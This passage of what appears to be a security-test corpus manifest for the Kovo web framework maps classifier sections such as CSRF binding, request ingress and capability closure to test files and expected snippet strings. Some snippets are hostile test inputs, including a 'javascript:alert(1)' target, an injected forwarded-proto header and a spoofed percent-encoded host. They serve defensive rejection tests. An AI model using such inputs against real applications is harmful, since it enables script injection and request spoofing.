          'allows an exact reviewed Headless UI callable',
          'projects the canonical name into code and manifest',
          'refuses an audited value import because module evaluation is executable authority',
          'tabsKeyDown as safeTabs',
        ],
      },
      {
        id: 'lexical-and-registry-integrity',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'sibling nested-block declaration',
          'genuine same-block lexical shadow',
          'requires an exact reviewed module and export pair',
          'snapshots generated registry data before later mutation attempts',
        ],
      },
      {
        id: 'component-event-boundary-closed',
        file: 'packages/compiler/src/handler-lowering.test.ts',
        snippets: [
          'fails closed before a forwarded component event',
          'inline-spread',
          'alias-spread',
          'ui-prefix-forgery',
          'ui-export-forgery',
          'type-only-forgery',
          'allows statically known data-only component spreads',
          'keeps reviewed @kovojs/ui component events',
        ],
      },
      {
        id: 'component-registry-exact-and-immutable',
        file: 'packages/compiler/src/component-event-boundary-registry.test.ts',
        snippets: [
          'stays pinned to the generated @kovojs/ui component descriptors',
          'requires an exact reviewed module and export pair',
          'cannot be mutated to widen or replace a reviewed decision',
        ],
      },
    ],
  },
  {
    id: 'capability-closure',
    marker: '@kovo-security-classifier-corpus capability-closure',
    testFiles: [
      'packages/compiler/src/capability-closure.security.test.ts',
      'packages/cli/src/capability-closure-packages.test.ts',
      'scripts/framework-export-posture-gate.test.mjs',
    ],
    verdictAnchors: [
      {
        id: 'complete-root-census',
        file: 'packages/compiler/src/capability-closure.security.test.ts',
        snippets: [
          'censuses every shipping untrusted-data root kind',
          "'application'",
          "'scheduled-task'",
          "'serialized-browser-handler'",
          "'webhook'",
        ],
      },
      {
        id: 'application-and-custom-adapter-roots',
        file: 'packages/compiler/src/capability-closure.security.test.ts',
        snippets: [
          'roots createApp lifecycle modules and closes their raw authority',
          'accepts the documented bootstrap-first separated custom Node adapter',
          'rejects a custom adapter that loads its handler before runtime bootstrap',
          'rejects runtime bootstrap in an inline toNodeHandler module',
          'rejects runtime bootstrap imported by the request handler instead of its adapter entry',
        ],
      },
      {
        id: 'transitive-module-and-callback-closure',
        file: 'packages/compiler/src/capability-closure.security.test.ts',
        snippets: [
          'wrappers, re-exports, literal dynamic import, and require',
          'callback-transfer:definePage(caller.ts callback/container)@wrapper.ts',
          'follows callback parameters through nested local wrapper factories',
          'dynamic-import target is not a compile-visible string literal',
        ],
      },
      {
        id: 'global-and-package-authority-closed',
        file: 'packages/compiler/src/capability-closure.security.test.ts',
        snippets: [
          'keeps shadowed globals and require open while closing global aliases',
          'closes platform loaders, Web execution, service workers, and Cloudflare sockets',
          'has no reviewed exact-version capability summary',
          'summary covers 1.2.2, installed package is 1.2.3',
          '2 contradictory summaries',
          'requires package summaries to classify side-effect module initialization explicitly',
          'only the compiler-owned Kovo registry',
        ],
      },
      {
        id: 'reviewed-positive-controls',
        file: 'packages/compiler/src/capability-closure.security.test.ts',
        snippets: [
          'keeps supported framework network, filesystem, process, and database doors open',
          'request-closes public testing and Vite tooling subpaths',
          'preserves raw driver closure while allowing reviewed Drizzle schema/query construction',
        ],
      },
      {
        id: 'first-party-runtime-export-posture',
        file: 'scripts/framework-export-posture-gate.test.mjs',
        snippets: [
          'binds every manifest-public runtime value and module initializer to reviewed posture',
          'kills omission, duplicate, and newly exported-member mutants',
          'digests fixture-named and generated production sources while excluding only tests and itself',
          'kills security-role omission across auth, secret, SQL, authorization, CSRF, and replay exports',
          "rootKind: 'application'",
        ],
      },
      {
        id: 'exact-package-identity-and-export-arms',
        file: 'packages/cli/src/capability-closure-packages.test.ts',
        snippets: [
          'pins package version, manifest fingerprint, and every conditional export arm',
          'marks absent conditional subpaths unresolved instead of inheriting a root verdict',
          'loads an exact summary ledger and fails closed on unknown or malformed authority fields',
        ],
      },
    ],
  },
  {
    id: 'finite-security-operation-ir',
    marker: '@kovo-security-classifier-corpus finite-security-operation-ir',
    testFiles: [
      'packages/compiler/src/security-operation-ir.security.test.ts',
      'packages/compiler/src/security-operation-ir.response-provenance.test.ts',
      'packages/cli/src/index.kovo-compile.test.ts',
      'packages/drizzle/src/index.phase2c-exact-tip-adversarial.test.ts',
      'packages/drizzle/src/index.mutation-private-scope-transfers.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'exact-emitted-browser-and-server-operation-manifests',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'carries exact compiler-derived operations in emitted browser and server artifacts',
          'securityHandler([',
          '__kovoSecurityOperationManifest_v1',
          'kovo-security-operation-ir/v1',
        ],
      },
      {
        id: 'realistic-reviewed-browser-operations',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'accepts realistic state, delegated-event, reviewed primitive, focus, form, and timer effects',
          'tabsTriggerClick',
          "Object(next)['focus']?.call(next)",
          'requestSubmit',
        ],
      },
      {
        id: 'runtime-selected-executable-reference-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          '@kovo-security-certifies C13 runtime-selected-handler-ref-closes',
          'closes a runtime-selected handler reference through %s',
          'direct ASCII-case variant',
          'static spread ASCII-case variant',
          'closes a runtime-selected %s merged through primitive attrs',
          'runtime-selected on:* handler reference is not compiler-authorized',
          'closes a runtime-selected executable selector through %s',
          'derive property ref (static-key spread)',
          'stream renderer ref (static-key spread)',
          'module allowlist authority (static-key spread)',
          'runtime-selected executable reference is not compiler-authorized',
          'keeps exact static reviewed executable references compiler-authorized',
          'kovoSafeJsxSpread',
        ],
      },
      {
        id: 'runtime-executable-selector-spread-closure',
        file: 'packages/server/src/jsx-runtime.test.ts',
        snippets: [
          'compiler-owned spread reconstruction omits every executable selector family',
          "'ON:LOAD'",
          "'DATA-BIND:HIDDEN'",
          "'data-bind-prop:checked'",
          "'data-kovo-module-allowlist'",
          "'data-stream-renderer'",
        ],
      },
      {
        id: 'string-timer-and-unknown-browser-receiver-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'closes %s through the finite browser timer operation',
          'string timer callbacks execute source text',
          'semantic root=serialized-browser-handler:onClick@',
          'closes a captured unknown receiver mutation instead of silently treating it as scalar code',
          'verdict=closed:unknown-operation',
        ],
      },
      {
        id: 'unknown-and-raw-browser-operations-close',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'raw DOM property assignment',
          'never-listed DOM method',
          'computed DOM method',
          'raw browser-global method',
          'raw storage capability',
        ],
      },
      {
        id: 'browser-authority-alias-and-container-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'closes %s across browser authority aliases and containers',
          'destructured DOM method alias',
          'mutable DOM receiver transfer',
          'container-carried DOM receiver',
          'constructor-carried DOM receiver',
          'local helper authority transfer',
          'Reflect.set',
        ],
      },
      {
        id: 'structured-server-and-exception-doors',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'accepts exact structured server operations and named justified exceptional doors',
          'unknown managed database method',
          'computed managed database method',
          'raw Response from mutation',
          'requires static justifications on the trustedSql and trustedHtml exceptional doors',
        ],
      },
      {
        id: 'raw-response-alias-helper-and-global-provenance-closure',
        file: 'packages/compiler/src/security-operation-ir.response-provenance.test.ts',
        snippets: [
          'fails closed when a mutation launders raw Response through %s',
          'a module-scope immutable alias',
          'a same-file helper without an authority argument',
          'an immutable zero-authority helper alias',
          'an immutable zero-authority helper container',
          'an ambient constructor identity wrapper',
          'a destructuring-reassigned helper',
          'an intervening loop binding',
          'qualified ambient access',
          'return globalThis.Response.json({ ok: true });',
          'fails closed when a handler-local helper container launders raw Response',
          'fails closed when a helper-container method is replaced before invocation',
          'an unreviewed zero-authority constructor',
          'Function.call on a helper container',
          'Function.apply on a helper container',
          'Function.bind on a helper container',
          'tag invocation on a local helper',
          'an imported opaque outcome',
          'an imported namespace member outcome',
          'an imported thenable awaited as an outcome',
          'an inline callback that invokes a raw helper',
          'an imported Array.from callback',
          'a same-file Array.map callback reference',
          'a same-file Promise executor reference',
          'fails closed for imported protocol execution through %s',
          'a direct parameter initializer',
          'a destructuring parameter initializer',
          'fails closed for imported operands at %s',
          'fails closed when imported authority moves through %s',
          'fails closed when a generic local operation receives imported authority at %s',
          'a nested helper default inside an immediate callback',
          'an object binding default',
          'implicit arguments authority',
          'fails closed for a sole rest-parameter handler',
          'fails closed for implicit this-bound definition authority',
          'an enum initializer',
          'using disposal',
          'fails closed for imported proxy execution through %s',
          'expect(kv449(prefix, body)).not.toEqual([])',
        ],
      },
      {
        id: 'cross-file-zero-authority-response-helper-closure',
        file: 'packages/cli/src/index.kovo-compile.test.ts',
        snippets: [
          '@kovo-security-certifies C13 cross-file-zero-authority-helper-closes',
          'export const RawResponse = Response; export function raw()',
          "import { RawResponse, raw } from './raw-helper.js';",
          'const alias = raw;',
          'const helpers = { raw };',
          "import * as rawHelpers from './raw-helper.js';",
          "return new RawResponse('raw')",
          "toContain('foreign server helper raw')",
          "toContain('foreign server constructor')",
        ],
      },
      {
        id: 'nested-input-helper-cannot-hide-owner-read',
        file: 'packages/drizzle/src/index.phase2c-exact-tip-adversarial.test.ts',
        snippets: [
          'fails closed when an input-named nested helper hides an owner read',
          'async function nested(context: { guard: { userId: string } })',
          'return nested(input);',
          'expect(full.check.output).toMatch(/KV406|KV414/u)',
        ],
      },
      {
        id: 'private-summary-finite-call-grammar',
        file: 'packages/drizzle/src/index.phase2c-exact-tip-adversarial.test.ts',
        snippets: [
          '@kovo-security-certifies C13 private-summary-sole-carrier-argument',
          'a strict-TS widened direct alias with side-effecting extra argument evaluation',
          'current(context, ...noArguments)',
          '@kovo-security-certifies C13 private-summary-one-direct-alias',
          'keeps a two-hop private helper alias chain outside OPP-28 proof',
          'emits KV438 for a widened private helper alias with extra argument evaluation',
          'emits KV438 for a two-hop private helper alias chain',
        ],
      },
      {
        id: 'exact-mutation-private-scope-transfer-and-write-effects',
        file: 'packages/drizzle/src/index.mutation-private-scope-transfers.test.ts',
        snippets: [
          '@kovo-security-certifies C13 handler-semantic-summary-direct-request-transfer',
          'requestTenantId(request)',
          'unsummarizedTenantId(request)',
          'helperContainer.requestTenantId(request)',
          'helperAlias(request)',
          'reboundTenantId(request)',
          "candidate.writeKey === 'account/exact'",
          "toEqual(['account/shared-one', 'account/shared-two'])",
          "path: 'targetId'",
        ],
      },
      {
        id: 'server-authority-alias-helper-and-transfer-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'closes structured server authority across receiver, scope, and destructured-call aliases',
          'fails closed when %s',
          'authority passed to an imported helper',
          'authority carried through an object container',
          'enrolls exact same-file authority helpers as reviewed local call edges',
          'server.helper.call',
          'keeps reviewed operation results as plain helper data rather than capabilities',
        ],
      },
      {
        id: 'normalized-helper-summary-provenance',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'discharges multi-hop helper edges through bottom-up normalized summaries',
          'kovo-security-semantic-graph/v2',
          'local:consume[arg0=context]',
          'local:dial[arg0=operation:server.egress.request]',
          'shows root, transfers, sink, and closed reason for helper alias mutation',
          'keeps helper summaries context-sensitive to exact authority inputs',
        ],
      },
      {
        id: 'normalized-helper-cycle-budget-and-posture-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'fails closed on recursive helper cycles with an explicit normalized verdict',
          'helper-cycle',
          'propagates query no-write posture through summarized helpers',
          'closes arguments-object recovery and deterministic call-depth exhaustion',
          'budget-call-depth',
          'fails closed for %s in normalized server semantics',
          'operation-function member laundering',
          'nested callable authority capture',
        ],
      },
      {
        id: 'server-root-census-and-query-closure',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'enrolls inline and same-file referenced server roots in emitted manifests',
          'server.handler.root',
          'query:catalog/read',
          'fails closed instead of silently dropping an %s root',
          'rejects managed database writes from an enrolled query root',
        ],
      },
      {
        id: 'server-framework-identity-and-principal-scope-operations',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'preserves exact framework identity through namespace exceptional-door imports',
          'classifies managed mutation-request and explicit principal-scope database operations',
          'server.authority.scope',
          'server.database.read',
          'server.database.write',
          'server.task.compose',
        ],
      },
      {
        id: 'starter-exact-data-identities-and-database-continuations',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'accepts the starter database chains and exact plain-data identities without widening the finite IR',
          'crypto.randomUUID()',
          "trustedAssign(id, 'framework-generated opaque identifier')",
          '.from(contacts).orderBy(contacts.id)',
          'does not grant reviewed data-helper identity through %s',
          'keeps randomUUID closed through %s',
          'keeps the ambient Error constructor closed through %s',
          'does not recognize finite database continuations through %s',
          'rejects imported executable database data through %s',
          'new Proxy({}, { get()',
          'request.db.select().dropEverything()',
        ],
      },
      {
        id: 'complete-mutation-form-security-fields',
        file: 'packages/compiler/src/security-operation-ir.security.test.ts',
        snippets: [
          'rejects standalone CSRF helpers targeting mutations but not same-named local lookalikes',
          "import { csrfField as field, mutation } from '@kovojs/server'",
          'function csrfField(_context, _options)',
        ],
      },
    ],
  },
  {
    id: 'csrf-principal-binding',
    marker: '@kovo-security-classifier-corpus csrf-principal-binding',
    testFiles: [
      'packages/server/src/csrf.test.ts',
      'packages/server/src/standalone-csrf-mint-security.test.ts',
      'packages/server/src/anonymous-csrf-cache-security.test.tsx',
      'packages/server/src/app-dispatch.test.ts',
      'packages/server/src/endpoint.test.ts',
      'packages/server/src/route.test.ts',
      'packages/server/src/app-mutation-request.test.ts',
      'packages/server/src/replay.test.ts',
      'packages/server/src/mutation/replay-policy.test.ts',
      'packages/server/src/mutation.test.ts',
      'packages/server/src/build.test.ts',
      'packages/server/src/csrf-lifecycle-property-oracle.test.tsx',
      'packages/better-auth/src/environment.test.ts',
      'scripts/check-csrf-mint-delivery.test.mjs',
    ],
    verdictAnchors: [
      {
        id: 'csrf-mint-delivery-matrix',
        file: 'scripts/check-csrf-mint-delivery.test.mjs',
        snippets: [
          'closes every lifecycle surface over live proof anchors',
          'kills a lifecycle-receipt deletion mutant',
          'kills a partial public mutation-helper mutant',
          'kills header-seal and cache-posture mutants',
          'kills rotation and replay-order mutants',
          'rejects denominator shrinkage, missing canaries, and stale proof anchors',
        ],
      },
      {
        id: 'csrf-lifecycle-state-model-oracle',
        file: 'packages/server/src/csrf-lifecycle-property-oracle.test.tsx',
        snippets: [
          'CSRF lifecycle state-model property oracle',
          'models anonymous mint, cookie delivery, validation, rotation, and exact replay',
          'rejects a rotated authenticated session token before replay lookup and requires a new mint',
        ],
      },
      {
        id: 'packed-node-vercel-csrf-delivery-parity',
        file: 'packages/server/src/build.test.ts',
        snippets: [
          'shares one packed anonymous-CSRF witness through emitted Node and Vercel app shells',
          'packed-csrf-stream-response',
          'packed-csrf-stream-immediate-response',
        ],
      },
      {
        id: 'standalone-response-lifecycle-receipt-and-sharing',
        file: 'packages/server/src/standalone-csrf-mint-security.test.ts',
        snippets: [
          'requires a response lifecycle receipt before a first anonymous mint',
          'reuses one standalone binding across a response request and its ordinary clone',
          'keeps exact nested response lifecycles isolated from the ambient outer frame',
          'lets an exact unsealed inner lifecycle outrank a sealed ambient outer lifecycle',
          'without a framework response lifecycle',
        ],
      },
      {
        id: 'standalone-pending-cookie-delivery-and-conflict',
        file: 'packages/server/src/anonymous-csrf-cache-security.test.tsx',
        snippets: [
          'captures a first-anonymous cookie minted by an immediate route stream pull',
          'auto-delivers a first-anonymous cookie from a verified safe endpoint stream pull',
          'keeps a nested route dispatch isolated from its ambient outer endpoint lifecycle',
          'keeps nested endpoint early returns from sealing their ambient outer lifecycle',
          'rejects an authored plain-name alias of a captured prefixed CSRF cookie',
          'delivers two distinct standalone CSRF cookie namespaces without collapsing either',
        ],
      },
      {
        id: 'same-exact-request-nested-dispatch-isolation',
        file: 'packages/server/src/anonymous-csrf-cache-security.test.tsx',
        snippets: [
          'clears ambient response authority before a new-Request nested dispatch runs preflight',
          'isolates a successful nested endpoint dispatch that reuses the exact handler Request',
          'preserves body bytes and abort propagation when rekeying a same-request nested dispatch',
          'keeps same-request nested auth denial from sealing the outer lifecycle',
          'keeps same-request nested access denial from sealing the outer lifecycle',
          'keeps same-request nested CSRF denial from sealing the outer lifecycle',
          'expect(innerRequest).not.toBe(outerRequest)',
        ],
      },
      {
        id: 'standalone-late-and-detached-rejection',
        file: 'packages/server/src/anonymous-csrf-cache-security.test.tsx',
        snippets: [
          'fails closed when a route stream first mints anonymous authority after headers commit',
          'rejects a detached reconstructed request in an external event after header commit',
          'after response headers were committed',
        ],
      },
      {
        id: 'standalone-raw-browser-state-proof-gates',
        file: 'packages/server/src/anonymous-csrf-cache-security.test.tsx',
        snippets: [
          'rejects a captured CSRF cookie from an unverified safe endpoint',
          'rejects a captured CSRF cookie from an unverified csrf:false unsafe endpoint',
          'allows a captured CSRF cookie on a privately self-verifying csrf:false endpoint',
        ],
      },
      {
        id: 'direct-endpoint-response-lifecycle-closes',
        file: 'packages/server/src/endpoint.test.ts',
        snippets: [
          'seals the retained handler request when direct runEndpoint execution resolves',
          'rejects a direct first-anonymous mint because runEndpoint has no cookie sink',
          'cannot deliver a first-anonymous CSRF binding cookie',
        ],
      },
      {
        id: 'direct-route-has-no-cookie-delivery-receipt',
        file: 'packages/server/src/route.test.ts',
        snippets: [
          'does not leave a cookie-delivery receipt after direct runRoutePage execution',
          'rejects a first-anonymous mint during direct runRoutePage execution',
          'seals the retained request returned by direct renderRoutePageResponse execution',
          'rejects pending first-anonymous authority from direct renderRoutePageResponse',
          'without a framework response lifecycle',
        ],
      },
      {
        id: 'framework-form-requires-cookie-sink',
        file: 'packages/server/src/csrf.test.ts',
        snippets: [
          'requires a cookie sink before a framework form can mint its first anonymous binding',
          'without a Set-Cookie sink',
          'onCsrfSetCookie',
        ],
      },
      {
        id: 'raw-response-posture-header-snapshot',
        file: 'packages/server/src/app-dispatch.test.ts',
        snippets: [
          'snapshots raw headers before a nested microtask can add browser state',
          "retainedResponse?.headers.set('Clear-Site-Data'",
          "retainedResponse?.headers.set('Set-Cookie'",
        ],
      },
      {
        id: 'bounded-generic-session-id-and-framework-posture',
        file: 'packages/server/src/csrf.test.ts',
        snippets: [
          'accepts bounded opaque session ids and never downgrades malformed ids to a cookie',
          'fails closed instead of using anonymous CSRF for proven, unresolved, or contradictory framework sessions',
          "'x'.repeat(1_025)",
        ],
      },
      {
        id: 'session-anonymous-domain-separation',
        file: 'packages/server/src/csrf.test.ts',
        snippets: [
          'length-frames session and anonymous bindings so namespace-shaped ids cannot collide',
          'namespacedSessionId',
        ],
      },
      {
        id: 'replay-scope-length-framing',
        file: 'packages/server/src/replay.test.ts',
        snippets: [
          'length-frames mutation identity and CSRF session scope without delimiter collisions',
          "mutationKey: 'account\\0save'",
          "request: { sessionId: 'save\\0alice' }",
        ],
      },
      {
        id: 'bounded-replay-scope-budget',
        file: 'packages/server/src/replay.test.ts',
        snippets: [
          'uses one embedded framework principal and one standalone replay principal within the durable scope budget',
          'toHaveLength(3_158)',
          'rejects a changed embedded framework principal before returning a replay scope',
        ],
      },
      {
        id: 'bounded-nojs-replay-scope-budget',
        file: 'packages/server/src/mutation/replay-policy.test.ts',
        snippets: [
          'keeps the maximum framework identity within the no-JS durable scope budget',
          'toHaveLength(3_163)',
          'rejects an oversized mutation identity before no-JS replay-store access',
        ],
      },
      {
        id: 'bounded-csrf-principal-and-anonymous-secret',
        file: 'packages/server/src/csrf.test.ts',
        snippets: [
          'accepts a 1,024-code-unit framework principal and rejects 1,025 before anonymous fallback',
          'accepts at most 1,024 anonymous-cookie code units and keeps framework mints at 43',
          "'A'.repeat(1_025)",
        ],
      },
      {
        id: 'bounded-source-derived-mutation-identity',
        file: 'packages/server/src/mutation.test.ts',
        snippets: [
          'bounds compiler-derived mutation keys to 1,024 code units before consuming the definition',
          "'m'.repeat(1_025)",
          "defineMutation('m'.repeat(1_025)",
        ],
      },
      {
        id: 'cross-principal-csrf-and-replay-isolation',
        file: 'packages/server/src/app-mutation-request.test.ts',
        snippets: [
          'keeps shared CSRF rotation ids and replay records bound to the current framework principal',
          'expect(crossPrincipal.status).toBe(422)',
          "expect(handlerUsers).toEqual(['alice', 'bob'])",
        ],
      },
      {
        id: 'oversized-principal-fails-before-effects',
        file: 'packages/server/src/app-mutation-request.test.ts',
        snippets: [
          'rejects an oversized framework principal before replay-store or handler execution',
          'expect(replayStore.get).not.toHaveBeenCalled()',
          'expect(handler).not.toHaveBeenCalled()',
        ],
      },
      {
        id: 'better-auth-session-id-floor',
        file: 'packages/better-auth/src/environment.test.ts',
        snippets: [
          'owns request binding and rejects authored callbacks, malformed sessions, and Proxies',
          '{ session: {} }',
          "{ session: { id: '' }, authCsrfId: 'downgrade' }",
        ],
      },
    ],
  },
  {
    id: 'trusted-client-ip',
    marker: '@kovo-security-classifier-corpus trusted-client-ip',
    testFiles: [
      'packages/server/src/request-state-intrinsics.test.ts',
      'packages/server/src/client-ip.test.ts',
      'packages/server/src/node.test.ts',
      'packages/create-kovo/src/index.build.prod-artifact.client-ip.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'canonical-address-only-and-malformed-node-corpus',
        file: 'packages/server/src/request-state-intrinsics.test.ts',
        snippets: [
          'canonicalizes trusted client node %s to address-only key %s',
          'keeps the proxy-nearest X-Forwarded-For hop while stripping its transport port',
          'rejects malformed, ambiguous, or non-IP Forwarded value %s',
          'for=203.0.113.9;proto=https;proto=http',
          'for=203.0.113.9;ext="a\\u0001b"',
          'rejects an empty terminal X-Forwarded-For hop instead of falling back leftward',
          'bounds many unique Forwarded extensions before per-IP rate admission',
        ],
      },
      {
        id: 'shell-guard-global-and-custom-authority-corpus',
        file: 'packages/server/src/client-ip.test.ts',
        snippets: [
          'keys $label by one canonical address across reconnects',
          'shares canonical trusted-proxy identity between the shell and per-IP guards',
          'keeps the global request floor when malformed proxy nodes cannot mint a per-IP key',
          'rejects conflicting trusted client-IP header families as ambiguous',
          'applies the global floor when an attacker header conflicts with the proxy-owned family',
          'leaves an explicit clientIp callback in charge of its opaque keys',
        ],
      },
      {
        id: 'real-front-proxy-reconnect-regression',
        file: 'packages/server/src/node.test.ts',
        snippets: [
          'keeps a real front-proxy reconnect in one per-IP bucket after stripping its source port',
          'expect(observedSourcePorts[0]).not.toBe(observedSourcePorts[1])',
          'upstreamStatuses: [303, 429]',
        ],
      },
      {
        id: 'generated-node-six-carrier-parity',
        file: 'packages/create-kovo/src/index.build.prod-artifact.client-ip.test.ts',
        snippets: [
          'keeps all built-in trusted-proxy port carriers in canonical per-IP buckets',
          "label: 'Forwarded IPv4 port'",
          "label: 'Forwarded IPv6 port'",
          "label: 'X-Forwarded-For IPv4 port'",
          "label: 'X-Forwarded-For IPv6 port'",
          "label: 'X-Real-IP IPv4 port'",
          "label: 'X-Real-IP IPv6 port'",
        ],
      },
    ],
  },
  {
    id: 'request-ingress',
    marker: '@kovo-security-classifier-corpus request-ingress',
    testFiles: [
      'packages/server/src/request-ingress-policy.test.ts',
      'packages/server/src/request-ingress-c13.test.ts',
      'packages/server/src/__bugz_remote_ingress.test.ts',
      'packages/server/src/node.test.ts',
      'packages/server/src/build.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'method-source-authority-scheme-target-superset',
        file: 'packages/server/src/request-ingress-c13.test.ts',
        snippets: [
          'preserves the complete closed method-identity verdict before Fetch construction',
          "'PoSt'",
          "'CONNECT'",
          'preserves explicit HTTP/1 and HTTP/2 source postures with exact authority evidence',
          "'%65xample.com'",
          "'example.com:443'",
          'selects only the explicitly trusted exact transport scheme before reconstruction',
          "'https, ftp'",
          "'HTTPS'",
          'admits only canonical origin or matching absolute targets and closes aliases',
          "'authority.example:443'",
          "'javascript:alert(1)'",
          "'mailto:security@example.test'",
          "target === '*' ? 'OPTIONS' : 'GET'",
        ],
      },
      {
        id: 'finite-classifier-source-selection',
        file: 'packages/server/src/request-ingress-policy.test.ts',
        snippets: [
          'finite request-ingress classifier',
          'admits exactly canonical standard methods plus byte-stable extension tokens',
          'binds HTTP/1 to exactly one raw Host and never borrows HTTP/2 evidence',
          'binds HTTP/2 to exact pseudo authority/scheme and rejects incompatible fields',
          'classifies request-target form before URL or route dispatch',
          'requires Vercel edge-owned scheme and canonical client provenance',
          'applies the same finite target ceiling to a platform-owned Fetch bridge',
        ],
      },
      {
        id: 'real-http2-method-authority-closure',
        file: 'packages/server/src/__bugz_remote_ingress.test.ts',
        snippets: [
          'rejects HTTP/2 method identities that Fetch would canonicalize before dispatch',
          "request('PoSt')",
          'rejects HTTP/2 authorities that URL would normalize before app policy',
          "request('%65xample.com')",
        ],
      },
      {
        id: 'generated-node-vercel-worker-parity',
        file: 'packages/server/src/build.test.ts',
        snippets: [
          'const requestIngressClassifier = (',
          'nodeHeadersToWebHeaders(pinnedNodeRequest.headers, requestTarget.authority)',
          'const prepared = prepareNodeRequestIngress(nodeRequest, options)',
          'preparedNodeRequestToWebRequest(prepared, nodeResponse)',
          'invalidStaticScheme',
          "'X-Forwarded-Proto: https, ftp\\r\\n'",
          'requestIngressClassifier.classify({',
          'const prepared = prepareVercelRequestIngress(nodeRequest)',
          "middlewarePath: 'kovo-ingress'",
          "'x-middleware-next': '1'",
          'INVALID_SCHEME_ASSET_MUST_NOT_RUN',
          'EXTENSION_METHOD_ASSET_MUST_NOT_RUN',
        ],
      },
    ],
  },
  {
    id: 'mutation-idem',
    marker: '@kovo-security-classifier-corpus mutation-idem',
    testFiles: [
      'packages/server/src/mutation/replay-policy.test.ts',
      'packages/server/src/webhook.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'bounded-time-scoped-wire-token',
        file: 'packages/server/src/mutation/replay-policy.test.ts',
        snippets: [
          'rejects a supplied %s no-JS token before replay-store access',
          'rejects an invalid supplied token even when replay storage is disabled',
          'admits one canonical fresh token to replay storage',
        ],
      },
      {
        id: 'bounded-webhook-event-id',
        file: 'packages/server/src/webhook.test.ts',
        snippets: [
          'rejects an %s webhook event id before replay-store or handler execution',
          'admits a 1,024-character webhook event id',
        ],
      },
    ],
  },
  {
    id: 'html-wire-identity',
    marker: '@kovo-security-classifier-corpus html-wire-identity',
    testFiles: [
      'packages/core/src/internal/semantic-attributes.test.ts',
      'packages/server/src/jsx-runtime.test.ts',
      'packages/server/src/wire-html.test.ts',
      'packages/compiler/src/browser-final-rereview.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'shared-html-and-form-canonicalization-corpus',
        file: 'packages/core/src/internal/semantic-attributes.test.ts',
        snippets: [
          'pins distinct DOM-identity and submitted-control wire boundaries',
          "'carriage-return'",
          "'line-feed'",
          "'nul'",
          "'unpaired-surrogate'",
          'rejects only option fallback whitespace that the browser strips or collapses',
          'pins the cross-attribute hidden _charset_ substitution without widening ordinary fields',
          "'reserved-charset-hidden-control'",
        ],
      },
      {
        id: 'runtime-and-raw-html-closed-verdicts',
        file: 'packages/server/src/jsx-runtime.test.ts',
        snippets: [
          'fails closed for a runtime-dynamic %s',
          'guards the generated kovo-form-key as a successful submitted value',
          'rejects a reserved _charset_ hidden value with %s before native form submission rewrites it',
          'skips an undefined exact-key value before applying case-folded duplicate semantics',
          'rejects trusted raw HTML where parsing derives a submitted text value',
          'record&#13;1',
        ],
      },
      {
        id: 'runtime-meta-refresh-first-attribute-verdict',
        file: 'packages/server/src/jsx-runtime.test.ts',
        snippets: [
          'classifies meta refresh from the browser-effective first ASCII-case-folded attribute',
          "'HTTP-EQUIV': 'refresh'",
          "'http-equiv': 'not-refresh'",
          'kovoSafeJsxSpread',
        ],
      },
      {
        id: 'direct-wire-emitter-closed-verdicts',
        file: 'packages/server/src/wire-html.test.ts',
        snippets: [
          'query name NUL',
          'query key lone surrogate',
          'fragment target CR',
          'text target lone surrogate',
        ],
      },
      {
        id: 'compiler-static-and-spread-closed-verdicts',
        file: 'packages/compiler/src/browser-final-rereview.test.ts',
        snippets: [
          'server HTML identity diagnostics',
          'rejects compiler-known %s before server render',
          'checks static intrinsic spread values through the same wire predicate',
          'rejects the reserved _charset_ hidden-value rewrite from %s',
          'module-constant computed keys',
          'false same-key override exposing a later case-folded type',
          'nested fully-static object spread',
          'known undefined same-key omission',
          'known void same-key omission',
          'nested null spread with no enumerable keys',
          'nested undefined spread with no enumerable keys',
          'nested void spread with no enumerable keys',
          'nested false spread with no enumerable keys',
          'keeps emitted runtime sink authority for statically omitted spread values',
          'accepts wire-stable DOM and submitted identities',
        ],
      },
    ],
  },
  {
    id: 'drizzle-analyzer-provenance',
    marker: '@kovo-security-classifier-corpus drizzle-analyzer-provenance',
    testFiles: [
      'packages/drizzle/src/index.scope-audits.test.ts',
      'packages/drizzle/src/index.mass-assignment.test.ts',
      'packages/drizzle/src/index.columns-keys-predicates-provenance.test.ts',
      'packages/drizzle/src/index.summary-callable-stability.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'private-summary-structural-proof-boundary',
        file: 'packages/drizzle/src/index.scope-audits.test.ts',
        snippets: [
          'accepts an explicitly summarized guard principal from an exact query context',
          'rejects guard/session/tenant declarations that do not match exact local structure',
          'forgedGuard(input)',
          'forgedSession(input)',
          'forgedTenant(input)',
          'exactGuard(input)',
          'function rest(...ctx: any[])',
          'function* generated',
          'kovoAnalyzerSummary(importedGuard',
          "{ name: 'mismatchedOrders', scope: 'unknown' }",
          'renamedCarrierOrders',
          "{ name: 'renamedCarrierOrders', scope: 'unknown' }",
        ],
      },
      {
        id: 'private-summary-direct-callable-stability',
        file: 'packages/drizzle/src/index.summary-callable-stability.test.ts',
        snippets: [
          'analyzer-summary callable stability',
          'fails closed after %s',
          'Object.assign',
          'Object.defineProperty',
          'Reflect.set',
          'an opaque mutator',
          'later receiver reassignment',
          'a reflectively replaced direct-helper container',
          'a frozen-syntax callable container',
          'outside the direct-callable positive grammar',
          'a direct function declaration',
          'replaces a private value-container cell',
